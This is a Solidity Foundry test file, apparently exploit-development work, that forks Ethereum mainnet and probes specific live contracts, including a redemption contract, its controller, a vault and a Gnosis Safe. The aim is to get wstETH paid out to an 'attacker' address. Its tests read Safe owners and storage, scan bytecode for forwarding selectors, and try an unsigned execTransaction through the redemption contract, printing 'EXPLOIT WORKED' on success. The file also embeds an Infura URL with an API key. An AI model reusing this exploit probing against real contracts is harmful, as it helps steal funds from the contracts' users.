// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IGnosisSafe {
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function nonce() external view returns (uint256);
    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory signatures
    ) external payable returns (bool);
}

contract GnosisSafeExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    // SLOT4_PROXY is a Gnosis Safe proxy!
    address constant GNOSIS_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant GNOSIS_SINGLETON = 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeGnosisSafe() public view {
        console.log("=== ANALYZING GNOSIS SAFE ===\n");

        IGnosisSafe safe = IGnosisSafe(GNOSIS_SAFE);

        console.log("Gnosis Safe address:", GNOSIS_SAFE);
        console.log("Singleton:", GNOSIS_SINGLETON);

        // Get owners
        try safe.getOwners() returns (address[] memory owners) {
            console.log("\nOwners count:", owners.length);
            for (uint i = 0; i < owners.length; i++) {
                console.log("  Owner", i, ":", owners[i]);
            }
        } catch {
            console.log("getOwners() failed");
        }

        // Get threshold
        try safe.getThreshold() returns (uint256 threshold) {
            console.log("\nThreshold:", threshold);
        } catch {
            console.log("getThreshold() failed");
        }

        // Get nonce
        try safe.nonce() returns (uint256 n) {
            console.log("Nonce:", n);
        } catch {
            console.log("nonce() failed");
        }

        // Check Safe storage
        console.log("\nGnosis Safe storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(GNOSIS_SAFE, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_CheckRedemption1UsesGnosisSafe() public view {
        console.log("=== CHECKING IF REDEMPTION_1 USES GNOSIS SAFE ===\n");

        // REDEMPTION_1 storage slot 4 contains GNOSIS_SAFE address
        bytes32 slot4 = vm.load(REDEMPTION_1, bytes32(uint256(4)));
        console.log("REDEMPTION_1 slot 4:");
        console.logBytes32(slot4);
        console.log("As address:", address(uint160(uint256(slot4))));

        // Does REDEMPTION_1 delegatecall to the Gnosis Safe?
        // If so, we might be able to use Safe's execTransaction...
    }

    function test_AnalyzeRedemption1Functions() public {
        console.log("=== ANALYZING REDEMPTION_1 FUNCTIONS ===\n");

        // Try to identify public functions in REDEMPTION_1
        // From earlier analysis:
        // 0x715018a6 = renounceOwnership()
        // 0xf2fde38b = transferOwnership(address)
        // 0x8da5cb5b = owner()
        // 0x5c975abb = paused()
        // 0x79ba5097 = acceptOwnership()
        // 0xeda72134 = TASSET()

        console.log("Testing REDEMPTION_1 functions:");

        // Try owner()
        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s1 && d1.length >= 32) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        // Try TASSET()
        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("TASSET()")
        );
        if (s2 && d2.length >= 32) {
            console.log("TASSET():", abi.decode(d2, (address)));
        }

        // Try paused()
        (bool s3, bytes memory d3) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("paused()")
        );
        if (s3 && d3.length >= 32) {
            console.log("paused():", abi.decode(d3, (bool)));
        }

        // Check if there's a finalizeRedeem or similar
        console.log("\nTrying redemption functions:");

        vm.startPrank(attacker);
        deal(IAU, attacker, 10000e18);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        (bool r1,) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("redeem(uint96):", r1);

        (bool r2,) = REDEMPTION_1.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem(uint256):", r2);

        (bool r3,) = REDEMPTION_1.call(
            abi.encodeWithSignature("claim(uint256)", 0)
        );
        console.log("claim(uint256):", r3);

        vm.stopPrank();
    }

    function test_CheckRedemption1ForForwardPattern() public view {
        console.log("=== CHECKING FOR FORWARD/PROXY PATTERN ===\n");

        // Maybe REDEMPTION_1 has a forward() or execute() function
        // that we can use to make it call RC.redeem

        bytes memory code = REDEMPTION_1.code;

        // Search for common forwarding/execute patterns
        bytes4[] memory selectors = new bytes4[](10);
        selectors[0] = bytes4(keccak256("execute(address,bytes)"));
        selectors[1] = bytes4(keccak256("forward(address,bytes)"));
        selectors[2] = bytes4(keccak256("delegatecall(address,bytes)"));
        selectors[3] = bytes4(keccak256("call(address,bytes)"));
        selectors[4] = bytes4(keccak256("execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)"));
        selectors[5] = bytes4(keccak256("exec(address,bytes)"));
        selectors[6] = bytes4(keccak256("multicall(bytes[])"));
        selectors[7] = bytes4(keccak256("batch(bytes[])"));
        selectors[8] = bytes4(keccak256("executeCall(address,bytes)"));
        selectors[9] = bytes4(keccak256("relay(address,bytes)"));

        console.log("Searching for execute-like selectors in REDEMPTION_1:");
        for (uint s = 0; s < selectors.length; s++) {
            bytes4 sel = selectors[s];
            for (uint i = 0; i + 4 < code.length; i++) {
                if (uint8(code[i]) == 0x63) { // PUSH4
                    bytes4 found = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                    if (found == sel) {
                        console.log("  Found selector at offset:", i);
                        console.logBytes4(sel);
                    }
                }
            }
        }
    }

    function test_TraceRedemption1Delegatecalls() public {
        console.log("=== TRACING REDEMPTION_1 DELEGATECALLS ===\n");

        // REDEMPTION_1 has addresses in slots 4 and 5
        // Slot 4 = Gnosis Safe proxy
        // Slot 5 = Another contract

        // If REDEMPTION_1 delegatecalls to Gnosis Safe,
        // the call will execute in REDEMPTION_1's context!

        // The Gnosis Safe has execTransaction which calls arbitrary targets
        // If we can make REDEMPTION_1 delegatecall to Safe, then call execTransaction,
        // we could make REDEMPTION_1 call RC.redeem!

        // But who can call REDEMPTION_1's functions that trigger delegatecall?

        console.log("Checking REDEMPTION_1 storage for clues:");
        console.log("  Slot 0 (owner):");
        console.logBytes32(vm.load(REDEMPTION_1, bytes32(uint256(0))));

        console.log("  Slot 4 (Safe proxy):");
        console.logBytes32(vm.load(REDEMPTION_1, bytes32(uint256(4))));

        console.log("  Slot 5 (other impl):");
        console.logBytes32(vm.load(REDEMPTION_1, bytes32(uint256(5))));

        // Try calling execTransaction through REDEMPTION_1
        console.log("\nTrying execTransaction via REDEMPTION_1:");

        bytes memory callToRC = abi.encodeWithSignature(
            "redeem(uint256,address)",
            100e18,
            attacker
        );

        vm.startPrank(attacker);

        // Craft execTransaction call
        // execTransaction(to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, signatures)
        (bool success,) = REDEMPTION_1.call(
            abi.encodeWithSignature(
                "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)",
                REDEMPTION_CONTROLLER, // to
                0, // value
                callToRC, // data
                0, // operation (CALL)
                0, // safeTxGas
                0, // baseGas
                0, // gasPrice
                address(0), // gasToken
                address(0), // refundReceiver
                "" // signatures (empty for now)
            )
        );

        console.log("execTransaction via REDEMPTION_1:", success);

        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        if (attackerBal > 0) {
            console.log("\n*** EXPLOIT WORKED! ***");
            console.log("Attacker wstETH:", attackerBal / 1e18);
        }
    }

    function test_DirectSafeExecAsOwner() public {
        console.log("=== TRYING DIRECT SAFE EXEC AS OWNER ===\n");

        IGnosisSafe safe = IGnosisSafe(GNOSIS_SAFE);

        // Get owners
        address[] memory owners;
        try safe.getOwners() returns (address[] memory o) {
            owners = o;
            console.log("Safe owners count:", owners.length);
            for (uint i = 0; i < owners.length; i++) {
                console.log("  Owner:", owners[i]);
            }
        } catch {
            console.log("Could not get owners");
            return;
        }

        uint256 threshold;
        try safe.getThreshold() returns (uint256 t) {
            threshold = t;
            console.log("Threshold:", threshold);
        } catch {
            console.log("Could not get threshold");
            return;
        }

        // If we can become a Safe owner or lower threshold to 0...
        // That would allow arbitrary execution

        // Check if any owner is a contract we might be able to manipulate
        for (uint i = 0; i < owners.length; i++) {
            address owner = owners[i];
            if (owner.code.length > 0) {
                console.log("\nOwner", i, "is a contract!");
                console.log("  Code size:", owner.code.length);

                // Check if this contract has any public functions we can call
            }
        }
    }
}
